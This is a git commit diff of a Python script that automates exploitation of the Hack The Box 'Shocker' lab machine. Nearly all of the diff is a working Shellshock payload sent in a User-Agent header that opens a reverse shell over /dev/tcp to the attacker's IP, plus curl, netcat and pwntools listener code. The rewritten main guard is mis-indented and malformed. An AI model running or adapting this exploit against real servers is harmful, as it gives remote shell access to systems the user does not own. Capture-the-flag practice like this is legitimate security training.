8ac4787f841e2b27d366c2e2c10ae6019fe890a0
p0ch4t <70673234+p0ch4t@users.noreply.github.com>
2020-11-24 22:48:09 -0300

    Automatizacion para Maquina Shocker de HTB
    Mejoras para evitar el uso de linux

--- AutoHackShocker.py
+++ AutoHackShocker.py
@@ -1,14 +1,15 @@
 #!/usr/bin/python3
 
-import requests
-import subprocess
+import requests, threading
+from pwn import *
 
 url = 'http://10.10.10.56/cgi-bin/user.sh'
 
-#user_agent= { "User-Agent" : "() { :; }; /bin/bash >& /dev/tcp/10.10.14.30/443" }	#Modifique su IṔ
-#user_agent = {'User-Agent': '() { :; }; ', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
-#requests.post(url, headers=user_agent)
+def shellshock():
+  user_agent= { "User-Agent" : "() { :; }; /bin/bash >& /dev/tcp/10.10.14.30/443" }	#Modifique su IṔ
+  requests.get(url, headers=user_agent)
 
-
-subprocess.call('x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &', shell=True)
-subprocess.call("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.30/443 0>&1' http://10.10.10.56/cgi-bin/user.sh", shell=True) 	#Modifique su ip
+ if __name__ == __main__:
+  threading.Thread(target=shellshock).start()
+  shell = listen(443).wait_for_connection()
+  shell.interactive()
